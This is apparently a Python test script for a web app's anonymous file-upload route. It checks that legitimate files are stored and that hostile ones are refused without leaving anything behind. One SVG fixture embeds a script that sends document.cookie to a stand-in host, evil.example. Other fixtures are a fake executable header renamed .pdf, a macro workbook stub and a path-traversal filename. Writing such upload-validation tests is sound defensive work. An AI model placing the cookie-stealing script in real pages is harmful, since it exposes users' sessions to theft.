"""`POST /api/client/{token}/submit` once it carries files - the anonymous
multipart surface, and everything it refuses.

This is the only unauthenticated *write* in PRISM and it now accepts bytes, so
what this file mostly asserts is the "no" side. Every refusal below is checked
twice: the answer the caller gets, and - the clause that actually catches a
partial write - that the intake is byte-for-byte where it was, still `issued`,
still with an empty manifest, and with nothing left behind in storage. A route
that refuses a file *after* saving it looks identical to a correct one from the
outside, and only the second half of each pair can tell them apart.

**Every fixture is a real file of its type**, built by the libraries that read
that type rather than by a hand-copied magic number: Pillow writes the PNG,
JPEG, GIF and WebP (it arrives with reportlab, which is in `requirements.txt`,
so this is a declared dependency and not a lucky import), reportlab writes the
PDF, python-docx the `.docx` and openpyxl the `.xlsx`. That matters for the
signature table in `main.py`: a table asserted against fixtures this file wrote
from the same constants would only prove the constants agree with themselves.
The refusals go the other way - a genuine Windows executable header renamed
`.pdf`, and a genuine SVG.

Every submit goes through its own `TestClient` bound to its own address. The
client write routes are rate-limited at 20 per address per minute and this file
sends more than that in total; one address per request keeps a rate-limit
refusal from ever being mistaken for the refusal under test.

    cd backend
    .venv/Scripts/python.exe scripts/check_client_upload.py
"""

from __future__ import annotations

import io
import os
import sys
import tempfile
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
os.environ["GENERATED_DIR"] = tempfile.mkdtemp(prefix="prism-client-upload-")
# Off, because every check in this project runs OFFLINE. The brief check is a
# real Gemini call on the generation path; left on, these scripts would reach
# the network, cost money, and fail on a machine with no key. `app/main.py`
# reads the flag at call time, so this line is the whole of the opt-out.
os.environ["CHECK_BRIEF_IS_REAL"] = "0"
# Blanked before `app.config` reads the environment, exactly as every other
# API-level check script does: `config` loads `backend/.env` once at import via
# `load_dotenv(..., override=False)`, and this repo's real one names an actual
# Supabase project.
os.environ["SUPABASE_URL"] = ""
os.environ["SUPABASE_ANON_KEY"] = ""
os.environ["SUPABASE_JWT_SECRET"] = ""
# And all five Spaces settings, for the sharper reason `check_intakefiles.py`
# spells out at its own top: `backend/.env` on this machine holds real
# DigitalOcean credentials for a real bucket, and this file drives a route whose
# whole job is now to write objects. Without these five lines every happy-path
# submit below would put a file into the user's own Space and every "nothing was
# left behind" assertion would be listing it. Blanked here, so
# `intakefiles.configured()` is False and the local backend - the one that
# exists precisely so these scripts stay offline - is what answers.
os.environ["DO_SPACES_ACCESS_KEY"] = ""
os.environ["DO_SPACES_SECRET_KEY"] = ""
os.environ["DO_SPACES_REGION"] = ""
os.environ["DO_SPACES_BUCKET"] = ""
os.environ["DO_SPACES_ENDPOINT"] = ""

import docx  # noqa: E402
import openpyxl  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from PIL import Image  # noqa: E402
from reportlab.lib.pagesizes import A4  # noqa: E402
from reportlab.pdfgen import canvas  # noqa: E402

from app import clientview  # noqa: E402
from app import config  # noqa: E402
from app import intakefiles  # noqa: E402
from app import intakes  # noqa: E402
from app import main as main_module  # noqa: E402
from app import settings  # noqa: E402
from app import workspaces  # noqa: E402
from app.main import app  # noqa: E402

FAILURES: list[str] = []


def ok(label: str, condition: bool) -> None:
    print(("ok    " if condition else "FAIL  ") + label)
    if not condition:
        FAILURES.append(label)


# --- Real files of every type this route has an opinion about ----------------


def image_bytes(fmt: str, size: tuple[int, int] = (24, 18)) -> bytes:
    """A genuine raster, encoded by Pillow rather than asserted by hand."""
    out = io.BytesIO()
    Image.new("RGB", size, (30, 90, 160)).save(out, format=fmt)
    return out.getvalue()


def pdf_bytes(text: str = "") -> bytes:
    """A genuine PDF. With no text at all it is the scan-with-no-text-layer
    case - a real page, nothing extractable on it."""
    out = io.BytesIO()
    page = canvas.Canvas(out, pagesize=A4)
    if text:
        page.drawString(72, 720, text)
    page.showPage()
    page.save()
    return out.getvalue()


def docx_bytes(text: str) -> bytes:
    out = io.BytesIO()
    document = docx.Document()
    document.add_paragraph(text)
    document.save(out)
    return out.getvalue()


def xlsx_bytes(text: str) -> bytes:
    out = io.BytesIO()
    book = openpyxl.Workbook()
    book.active["A1"] = text
    book.save(out)
    return out.getvalue()


def xlsm_bytes(text: str) -> bytes:
    """A real workbook with a VBA project inside it.

    That entry is the only thing that makes an `.xlsm` different from an
    `.xlsx` - same zip, same sheets, same cells, plus a program - and it is the
    whole reason this door will not take one. Built rather than described,
    because a fixture that was merely an `.xlsx` with a different name would
    pass or fail this test for the wrong reason.
    """
    out = io.BytesIO(xlsx_bytes(text))
    with zipfile.ZipFile(out, "a", zipfile.ZIP_DEFLATED) as archive:
        # The OLE compound-file header a vbaProject.bin actually begins with.
        archive.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64)
    return out.getvalue()


#: The first 24 bytes of a real HEIC - its ISO base media `ftyp` box, verbatim:
#: a four-byte box length, the marker at offset 4, then the major brand, the
#: minor version and the compatible brands. Taken byte for byte off an actual
#: `.heic` rather than written from memory, because this is the one type in the
#: allowlist that no library in `requirements.txt` can encode, and it is also the
#: format an iPhone photographs a site in - so if the offset in `_SIGNATURES`
#: were wrong, the commonest photograph a client will ever attach would be
#: refused as "not a file PRISM can take" with nothing here to notice.
#:
#: A header and filler, not a whole image, and that is all this proves: that a
#: file which begins the way a HEIC begins is accepted. Nothing downstream
#: decodes it - a raster is stored and shown, never read for text.
HEIC = b"\x00\x00\x00\x18ftypheic\x00\x00\x00\x00mif1heic" + b"\x00" * 64

#: A real SVG - the file the whole raster allowlist exists to refuse. It is an
#: image by every ordinary definition and a script document by the only one that
#: matters here.
SVG = (
    b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
    b'<script>fetch("https://evil.example/"+document.cookie)</script>'
    b'<rect width="10" height="10" fill="red"/></svg>'
)

#: The first bytes of a real Windows PE executable: the DOS header, its stub
#: and the `PE\0\0` signature the loader actually looks for. Renamed `.pdf`
#: below, which is the attack - the extension and the declared type are both
#: chosen by whoever is uploading, and neither is evidence of anything.
EXE = (
    b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    + b"\x00" * 0x30
    + b"\x80\x00\x00\x00"
    + b"This program cannot be run in DOS mode.\r\r\n$"
    + b"\x00" * 0x20
    + b"PE\x00\x00"
)

PNG = image_bytes("PNG")
JPEG = image_bytes("JPEG")
GIF = image_bytes("GIF")
WEBP = image_bytes("WEBP")
PDF = pdf_bytes("A scope of work for a two-branch clinic booking site.")
BLANK_PDF = pdf_bytes()
DOCX = docx_bytes("The requirements, as the client wrote them in Word.")
XLSX = xlsx_bytes("Line one of the requirement list.")
XLSM = xlsm_bytes("Line one of the requirement list, with a program attached.")


workspaces.ensure_ready()

with TestClient(app) as client:
    home = workspaces.create("Upload Studio")
    workspaces.use(home.id)
    settings.save(settings.load().model_copy(update={"studio_name": "Upload Studio Name"}))

    _addresses = iter(f"198.51.100.{octet}" for octet in range(2, 250))

    def fresh() -> intakes.Intake:
        """An `issued` intake with nothing on it yet."""
        workspaces.use(home.id)
        return intakes.create(
            client_email="",
            client_phone="",
            scope="",
            budget_text="",
            preset={},
            created_by="admin@neptune.ph",
        )

    def submit(token: str, files=None, **fields):
        """One multipart submit, from an address no other submit has used."""
        body = {
            "client_email": "buyer@client.com",
            # Long enough to clear the client door's scope floor. This
            # file is about files, not about `_normalise_scope`.
            "scope": "A booking site for a two-branch dental clinic in Makati.",
            "budget_text": "100k",
        }
        body.update(fields)
        caller = TestClient(app, client=(next(_addresses), 50000))
        return caller.post(f"/api/client/{token}/submit", data=body, files=files or [])

    def untouched(entry: intakes.Intake, label: str) -> None:
        """The whole "and nothing happened" half of a refusal, in one place."""
        after = intakes.get(entry.id)
        workspaces.use(home.id)
        stored = intakefiles.listing(entry.id)
        ok(
            f"{label}: the intake did not move off issued",
            after is not None and after.state == intakes.ISSUED,
        )
        ok(f"{label}: its manifest is still empty", after is not None and after.attachments == [])
        ok(f"{label}: and nothing was left behind in storage", stored == [])

    # --- The happy path: a document and an image, together -------------------

    both = fresh()
    landed = submit(
        both.token,
        files=[
            ("documents", ("scope of work.pdf", PDF, "application/pdf")),
            ("images", ("site photo.png", PNG, "image/png")),
        ],
        scope="Two branches, one booking flow.",
    )
    ok("a document and an image submitted together: 200", landed.status_code == 200)

    stored_both = intakes.get(both.id)
    ok(
        "the intake moved issued -> submitted",
        stored_both is not None and stored_both.state == intakes.SUBMITTED,
    )
    ok("the manifest carries one entry per file", len(stored_both.attachments) == 2)
    ok(
        "every entry is exactly the five keys `intakefiles.save` returns",
        all(set(entry) == {"id", "name", "kind", "bytes", "note"} for entry in stored_both.attachments),
    )
    by_name = {entry["name"]: entry for entry in stored_both.attachments}
    ok(
        "the client's own filenames are kept as data",
        set(by_name) == {"scope of work.pdf", "site photo.png"},
    )
    ok(
        "with the canonical content type, not the extension and not a guess",
        by_name["scope of work.pdf"]["kind"] == "application/pdf"
        and by_name["site photo.png"]["kind"] == "image/png",
    )
    ok(
        "and the size that actually arrived",
        by_name["scope of work.pdf"]["bytes"] == len(PDF)
        and by_name["site photo.png"]["bytes"] == len(PNG),
    )
    ok(
        "a file id is a server-minted 12-hex, never anything the client sent",
        all(len(entry["id"]) == 12 and entry["id"] != entry["name"] for entry in stored_both.attachments),
    )

    workspaces.use(home.id)
    on_disk = intakefiles.listing(both.id)
    ok("both files really are in storage", len(on_disk) == 2)
    ok(
        "storage and the manifest agree on the ids and the sizes",
        {(row["id"], row["bytes"]) for row in on_disk}
        == {(entry["id"], entry["bytes"]) for entry in stored_both.attachments},
    )
    read_back = intakefiles.read(both.id, by_name["scope of work.pdf"]["id"])
    ok(
        "and the bytes come back the same bytes, under the same type",
        read_back is not None and read_back[0] == PDF and read_back[1] == "application/pdf",
    )

    ok(
        "the client's four fields still land alongside the files",
        stored_both.client_email == "buyer@client.com"
        and stored_both.scope == "Two branches, one booking flow.",
    )

    # --- What the client is shown back ---------------------------------------

    view = landed.json()
    ok("the response is the waiting face, as it was before files existed", view["state"] == "waiting")
    ok("which now lists what they attached", "attachments" in view)
    ok(
        "by name and size only",
        all(set(item) == {"name", "bytes"} for item in view["attachments"]),
    )
    ok(
        "naming both files the client actually sent",
        {item["name"] for item in view["attachments"]}
        == {"scope of work.pdf", "site photo.png"},
    )
    ok(
        "never the file id - a client needs to know it arrived, which is not the "
        "same need as being able to address it",
        all(entry["id"] not in repr(view) for entry in stored_both.attachments),
    )

    ok(
        "clientview.of projects the same thing off the record itself",
        clientview.of(stored_both)["attachments"]
        == [
            {"name": entry["name"], "bytes": entry["bytes"]}
            for entry in stored_both.attachments
        ],
    )
    ok(
        "and an intake with no files shows an empty list rather than omitting the key",
        clientview.of(intakes.Intake(id="1" * 12, state=intakes.SUBMITTED))["attachments"] == [],
    )

    # --- A file PRISM cannot read is reported, never raised -------------------

    scanned = fresh()
    scanned_response = submit(
        scanned.token,
        files=[("documents", ("photocopy.pdf", BLANK_PDF, "application/pdf"))],
    )
    ok("a PDF with no text layer is still accepted: 200", scanned_response.status_code == 200)
    scanned_stored = intakes.get(scanned.id)
    ok(
        "and it lands with the warning on its manifest entry rather than as a refusal",
        len(scanned_stored.attachments) == 1
        and "no text" in scanned_stored.attachments[0]["note"],
    )
    ok(
        "the note is not shown to the client - the waiting face is names and sizes",
        all(set(item) == {"name", "bytes"} for item in scanned_response.json()["attachments"]),
    )

    # --- Every type the store knows is accepted, by its own library's bytes ---

    # Posted interleaved on purpose. The manifest is asserted to come back
    # images-first, and a fixture that already listed the images first would
    # produce that order under either iteration order the reader could have -
    # proving the fixture rather than the code. Sent as document, image,
    # document, image, image, image, the two orders differ.
    every = fresh()
    every_response = submit(
        every.token,
        files=[
            ("documents", ("e.docx", DOCX, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")),
            ("images", ("a.png", PNG, "image/png")),
            ("documents", ("f.xlsx", XLSX, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")),
            ("images", ("b.jpg", JPEG, "image/jpeg")),
            ("images", ("c.gif", GIF, "image/gif")),
            ("images", ("d.webp", WEBP, "image/webp")),
        ],
    )
    ok(
        "a real PNG, JPEG, GIF, WebP, .docx and .xlsx are all accepted - the "
        "signature table matches what the encoders actually write",
        every_response.status_code == 200,
    )
    every_stored = intakes.get(every.id)
    ok(
        "all six land, each under its canonical type, images before documents - "
        "the order has to be some order and it cannot be the client's, because "
        "FastAPI has split one interleaved sequence of parts into two lists "
        "before this handler sees either",
        [entry["kind"] for entry in every_stored.attachments]
        == [
            "image/png",
            "image/jpeg",
            "image/gif",
            "image/webp",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        ],
    )
    ok(
        "and the .docx's text was extracted, so nothing was quietly stored unread",
        every_stored.attachments[4]["note"] == "",
    )

    # --- HEIC, which no library here can encode and every iPhone produces ----

    heic = fresh()
    heic_response = submit(heic.token, files=[("images", ("site.heic", HEIC, "image/heic"))])
    ok(
        "a file beginning the way a real HEIC begins is accepted - the one type "
        "in the allowlist with no encoder in requirements.txt, and the one a "
        "client is most likely to photograph a site with",
        heic_response.status_code == 200,
    )
    ok(
        "and it is stored as image/heic, on the raster side where nothing tries "
        "to read text out of it",
        intakes.get(heic.id).attachments[0]["kind"] == "image/heic"
        and intakes.get(heic.id).attachments[0]["note"] == "",
    )
    ok(
        "while the same declared type over bytes that are not a HEIC is refused - "
        "the marker is checked at its offset, not merely looked for",
        submit(fresh().token, files=[("images", ("site.heic", b"ftyp" + b"\x00" * 64, "image/heic"))]).status_code
        == 400,
    )

    # --- A browser that sends `application/octet-stream` is not punished ------

    vague = fresh()
    vague_response = submit(
        vague.token,
        files=[("documents", ("scope.docx", DOCX, "application/octet-stream"))],
    )
    ok(
        "a .docx a browser declared as application/octet-stream is still a .docx",
        vague_response.status_code == 200,
    )
    ok(
        "and it is stored under the type its extension names, not as a blob",
        intakes.get(vague.id).attachments[0]["kind"]
        == "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )

    # =========================================================================
    # The refusals
    # =========================================================================

    # --- An SVG, however it is dressed ---------------------------------------

    svg_intake = fresh()
    svg_response = submit(
        svg_intake.token,
        files=[("images", ("logo.svg", SVG, "image/svg+xml"))],
    )
    ok("an SVG is refused with 400", svg_response.status_code == 400)
    ok("and the refusal names the file", "logo.svg" in svg_response.json()["detail"])
    untouched(svg_intake, "svg")

    svg_renamed = fresh()
    svg_renamed_response = submit(
        svg_renamed.token,
        files=[("images", ("logo.png", SVG, "image/svg+xml"))],
    )
    ok(
        "an SVG renamed .png is refused too - an extension the uploader chose can "
        "never be what earns a file the raster allowlist",
        svg_renamed_response.status_code == 400,
    )
    untouched(svg_renamed, "svg renamed .png")

    svg_declared_png = fresh()
    svg_declared_png_response = submit(
        svg_declared_png.token,
        files=[("images", ("logo.png", SVG, "image/png"))],
    )
    ok(
        "and an SVG declared image/png is refused on its bytes - the declared type "
        "gets a file past the allowlist, the signature is what gets it stored",
        svg_declared_png_response.status_code == 400,
    )
    untouched(svg_declared_png, "svg declared image/png")

    # --- An executable wearing a document's name -----------------------------

    exe_intake = fresh()
    exe_response = submit(
        exe_intake.token,
        files=[("documents", ("invoice.pdf", EXE, "application/pdf"))],
    )
    ok(
        "an .exe renamed .pdf is refused with 400 - both the name and the declared "
        "type are the uploader's, and neither is evidence",
        exe_response.status_code == 400,
    )
    ok("and the refusal names the file", "invoice.pdf" in exe_response.json()["detail"])
    untouched(exe_intake, "exe renamed .pdf")

    exe_as_image = fresh()
    exe_as_image_response = submit(
        exe_as_image.token,
        files=[("images", ("photo.png", EXE, "image/png"))],
    )
    ok(
        "the same executable declared image/png is refused as well - the signature "
        "check covers the image path too, not only documents",
        exe_as_image_response.status_code == 400,
    )
    untouched(exe_as_image, "exe declared image/png")

    # --- A type PRISM has no business storing at all -------------------------

    zipped = fresh()
    zipped_response = submit(
        zipped.token,
        files=[("documents", ("everything.zip", b"PK\x03\x04nope", "application/zip"))],
    )
    ok("a type outside the store's own table is refused", zipped_response.status_code == 400)
    untouched(zipped, "zip")

    # --- A macro-enabled workbook, by every road into the door ----------------
    #
    # The one type the store can keep that this route will not take. It is a
    # program with a spreadsheet round it, `Content-Disposition: attachment` is
    # no defence because the download is the delivery, and the studio member who
    # opens it and clicks Enable Content is the target. All three roads are
    # tried: the macro type declared outright, the same file declared as "no
    # idea" so the extension decides, and - the one a type-only subtraction
    # would have missed - the macro file declared as an ordinary spreadsheet,
    # which matters because the studio downloads it under the client's own name
    # and `budget.xlsm` opens in Excel as a macro workbook whatever this server
    # stored it as.
    MACRO_TYPE = "application/vnd.ms-excel.sheet.macroEnabled.12"
    PLAIN_XLSX_TYPE = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    for label, declared_as in (
        ("declared as the macro type", MACRO_TYPE),
        ("declared as no type at all", "application/octet-stream"),
        ("declared as an ordinary spreadsheet", PLAIN_XLSX_TYPE),
    ):
        macro = fresh()
        macro_response = submit(
            macro.token, files=[("documents", ("budget.xlsm", XLSM, declared_as))]
        )
        ok(f"a macro-enabled workbook {label} is refused", macro_response.status_code == 400)
        ok(
            f"and {label} it is told what it actually is, with the one-step "
            "remedy - not the general list, which says a spreadsheet is fine to "
            "somebody holding a spreadsheet",
            "macro-enabled" in macro_response.json()["detail"]
            and ".xlsx" in macro_response.json()["detail"],
        )
        untouched(macro, f"xlsm {label}")

    ok(
        "and the plain .xlsx a client actually has is still taken - the same "
        "cells, without the program",
        submit(fresh().token, files=[("documents", ("budget.xlsx", XLSX, PLAIN_XLSX_TYPE))]).status_code
        == 200,
    )

    # --- An extension that does not agree with the declared type -------------
    #
    # Both halves are correct on their own here, which is what makes it worth a
    # test: the type resolves to application/pdf because that is what was
    # declared, and `.txt` is a document extension PRISM knows. What is wrong is
    # that they disagree - `attachments.read` keys its reader off the name, so
    # the text reader would decode PDF bytes as mojibake, find characters, and
    # report no problem at all. The manifest would then assert a clean read of a
    # file nothing read.

    mismatched = fresh()
    mismatched_response = submit(
        mismatched.token, files=[("documents", ("scope.txt", PDF, "application/pdf"))]
    )
    ok(
        "a .txt carrying PDF bytes and declaring application/pdf is refused - the "
        "extension and the type have to name the same reader, not merely both be "
        "recognised",
        mismatched_response.status_code == 400,
    )
    untouched(mismatched, "extension disagreeing with the declared type")

    ok(
        "while the ordinary disagreement is untouched: a .md a browser declared "
        "text/plain is a text file by both roads and is taken",
        submit(
            fresh().token,
            files=[("documents", ("notes.md", b"# Notes\n\nTwo branches.", "text/plain"))],
        ).status_code
        == 200,
    )

    # --- The refusal quotes the name the record would have kept --------------
    #
    # The success path stores `intakefiles.clean_name(...)`; a refusal that
    # interpolated the raw filename instead would be the same untrusted string
    # getting two different treatments, and would let a caller put kilobytes of
    # control characters into a response body by being refused rather than
    # accepted.

    hostile_name = "..\\..\\Windows\\ev\x07il" + "n" * 500 + ".zip"
    hostile = fresh()
    hostile_response = submit(
        hostile.token, files=[("documents", (hostile_name, b"PK\x03\x04nope", "application/zip"))]
    )
    hostile_detail = hostile_response.json()["detail"]
    ok("a hostile filename is refused like any other unusable type", hostile_response.status_code == 400)
    ok(
        "and the refusal carries the cleaned name - bounded, with no control "
        "character and no path separator in it",
        len(hostile_detail) < 400
        and "\x07" not in hostile_detail
        and "\\" not in hostile_detail
        and "Windows" not in hostile_detail,
    )
    untouched(hostile, "a hostile filename")

    # --- A long name keeps its extension -------------------------------------
    #
    # `clean_name` caps at 120 characters, and the last few of those are the
    # only part `resolve_type` and `attachments.read` key on. Cutting the tail
    # off would make a perfectly ordinary document refused by a message about
    # the wrong thing - a long name is a long name, not a file PRISM cannot
    # read.

    long_named = fresh()
    long_name = "Scope of Works - " + "a" * 200 + ".pdf"
    long_response = submit(
        long_named.token, files=[("documents", (long_name, PDF, "application/pdf"))]
    )
    ok("a document with a 200-character name is still taken", long_response.status_code == 200)
    long_stored = intakes.get(long_named.id).attachments[0]
    ok(
        "its name is capped but still ends in the extension it arrived with",
        len(long_stored["name"]) == 120 and long_stored["name"].endswith(".pdf"),
    )
    ok(
        "and it is stored as a PDF rather than as an unrecognised blob",
        long_stored["kind"] == "application/pdf",
    )

    # --- Past the per-file cap -----------------------------------------------

    oversized = fresh()
    oversized_response = submit(
        oversized.token,
        files=[
            (
                "documents",
                ("huge.txt", b"a" * (config.MAX_CLIENT_FILE_BYTES + 1), "text/plain"),
            )
        ],
    )
    ok(
        "a file one byte past the per-file cap is refused with 400 - by the "
        "handler, not by the gate's wire cap",
        oversized_response.status_code == 400,
    )
    ok("and the refusal names the file", "huge.txt" in oversized_response.json()["detail"])
    untouched(oversized, "past the per-file cap")

    # --- Past the count cap --------------------------------------------------

    too_many = fresh()
    too_many_response = submit(
        too_many.token,
        files=[
            ("images" if index % 2 else "documents", (f"file-{index}.txt", b"words", "text/plain"))
            for index in range(config.MAX_CLIENT_FILES + 1)
        ],
    )
    ok(
        f"more than {config.MAX_CLIENT_FILES} files is refused with 400",
        too_many_response.status_code == 400,
    )
    ok(
        "and the count is one number across both fields, not one each - splitting "
        "the same files between images and documents does not buy a second budget",
        str(config.MAX_CLIENT_FILES + 1) in too_many_response.json()["detail"],
    )
    untouched(too_many, "past the count cap")

    # --- Past the aggregate cap ----------------------------------------------
    #
    # At the real number, and deliberately not with the cap patched down. The
    # aggregate cap and `_gate`'s multipart wire cap are the same constant, on
    # purpose (`config.MAX_CLIENT_UPLOAD_TOTAL_BYTES`'s own comment: two
    # different things measured against one number), and the gate's allowance is
    # that number *plus* the envelope - so a body whose files sum to one byte
    # past the cap still fits through the gate and has to be refused by the
    # handler's own arithmetic. Asserting 400 rather than "not 200" is what
    # distinguishes the two: a 413 here would mean the gate caught it and the
    # handler's copy was never exercised.
    piece = config.MAX_CLIENT_UPLOAD_TOTAL_BYTES // 4
    aggregate = fresh()
    aggregate_response = submit(
        aggregate.token,
        files=[
            ("documents", ("part-0.txt", b"a" * piece, "text/plain")),
            ("documents", ("part-1.txt", b"a" * piece, "text/plain")),
            ("documents", ("part-2.txt", b"a" * piece, "text/plain")),
            ("documents", ("part-3.txt", b"a" * (piece + 1), "text/plain")),
        ],
    )
    ok(
        "four legal files summing to one byte past the aggregate cap are refused "
        "with 400 by the handler, not 413 by the gate",
        aggregate_response.status_code == 400,
    )
    untouched(aggregate, "past the aggregate cap")

    # --- A second submit against the same token ------------------------------
    #
    # The assertion that matters here is the last one. Cleaning up after a
    # refused advance by calling `intakefiles.forget()` would look correct
    # everywhere else in this file and would delete *the first submission's*
    # files right here - the prefix is the intake's, not the request's.

    workspaces.use(home.id)
    first_ids = {entry["id"] for entry in intakes.get(both.id).attachments}
    second = submit(
        both.token,
        files=[("documents", ("overwrite.pdf", PDF, "application/pdf"))],
        # Long enough to clear the scope floor, so the refusal this case
        # asserts is the one-write-only rule and not `_normalise_scope`.
        scope="OVERWRITE ATTEMPT on an intake that already has files.",
    )
    ok(
        "a second submit against the same token is refused with this door's usual "
        "opaque 404",
        second.status_code == 404
        and second.json() == {"detail": main_module._CLIENT_LINK_GONE},  # noqa: SLF001
    )
    after_second = intakes.get(both.id)
    ok(
        "the record still carries the first submission's own words and manifest",
        after_second.scope == "Two branches, one booking flow."
        and {entry["id"] for entry in after_second.attachments} == first_ids,
    )
    workspaces.use(home.id)
    after_second_storage = {row["id"] for row in intakefiles.listing(both.id)}
    ok(
        "and storage holds exactly the first submission's two files - the refused "
        "second attempt neither added a file nor deleted the ones already there",
        after_second_storage == first_ids,
    )

    # --- A submit with no files at all still works ---------------------------

    plain = fresh()
    plain_response = submit(plain.token)
    ok("a submit carrying no files at all is still a submit", plain_response.status_code == 200)
    ok(
        "with an empty manifest rather than a missing one",
        intakes.get(plain.id).attachments == [],
    )
    ok(
        "and an empty list on the client's own view",
        plain_response.json()["attachments"] == [],
    )

    # --- A save that fails takes nothing with it -----------------------------
    #
    # The other half of the orphan question: the advance is refused above, and
    # here the *save* is what fails. The record must not move, and the client
    # must be told their submission was lost rather than told the link is dead.

    failing = fresh()
    _real_save = main_module.intakefiles.save

    def _save_that_fails(*_args, **_kwargs):
        raise intakefiles.IntakeFileError("That file could not be saved.")

    try:
        main_module.intakefiles.save = _save_that_fails
        save_failed = submit(
            failing.token,
            files=[("documents", ("scope.pdf", PDF, "application/pdf"))],
        )
    finally:
        main_module.intakefiles.save = _real_save

    ok("a storage failure answers 500, not this door's usual refusal", save_failed.status_code == 500)
    ok(
        "and not the opaque 'gone' body - a lost submission must not read as a dead link",
        save_failed.json() != {"detail": main_module._CLIENT_LINK_GONE},  # noqa: SLF001
    )
    untouched(failing, "a save that failed")

    # --- The route's own shape -----------------------------------------------

    ok(
        "the file parameters are typed loosely on purpose - a browser posts an "
        "empty file input as a part with no filename, and a strict "
        "List[UploadFile] would make FastAPI refuse the whole request",
        submit(fresh().token, files=[("images", ("", b"", "application/octet-stream"))]).status_code
        == 200,
    )

print()
print(f"{len(FAILURES)} FAILED" if FAILURES else "all pass")
sys.exit(1 if FAILURES else 0)
